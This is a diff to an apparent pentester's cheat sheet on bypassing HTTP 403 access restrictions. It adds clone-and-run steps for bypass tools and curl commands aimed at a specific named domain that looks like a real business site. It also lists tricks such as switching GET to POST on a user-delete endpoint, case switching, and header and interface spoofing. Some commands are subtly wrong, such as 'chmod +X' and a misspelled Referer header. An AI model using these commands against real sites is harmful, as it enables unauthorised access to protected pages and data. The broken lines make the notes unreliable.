@@ -7,9 +7,20 @@ chmod +x 403-bypass.sh
 Execution: bash 403-bypass.sh -u "https://target.com/admin" --exploit
 
 
+https://github.com/aardwolfsecurityltd/Bulk_403_Bypass.git
+cd Bulk_403_Bypass
+chmod +X *
+./403_bypass.sh file.txt
+
+git clone https://github.com/iamj0ker/bypass-403
+cd bypass-403
+chmod +x bypass-403.sh
+./bypass-403.sh https://webbingprotechnologies.com/ assets
+
+
+
 
 Other Tools :https://github.com/iamj0ker/bypass-403
-             https://github.com/channyein1337/403-bypass/blob/main/403-bypass.py
              https://github.com/nico989/B1pass3r
 
 
@@ -65,6 +76,21 @@ site.com//;//secret –> HTTP 200 OK
 
 GET /users/delete/victim_id  ->403
 POST /users/delete/victim_id ->200
+
+
+curl -H "Content-Length:0" -X POST https://webbingprotechnologies.com/assets/
+
+
+
+Downgrade the protocol version. = 0.9,1.0,1.1
+
+
+Case switching technique = example.com/user gives you 401? Try example.com/User or example.com/USer
+	
+
+curl -H "Referrer:https://webbingprotechnologies.com/" https://webbingprotechnologies.com/assets
+curl –interface cloud-provider-ip https://webbingprotechnologies.com/assets
+
 
 
                                                                                                 
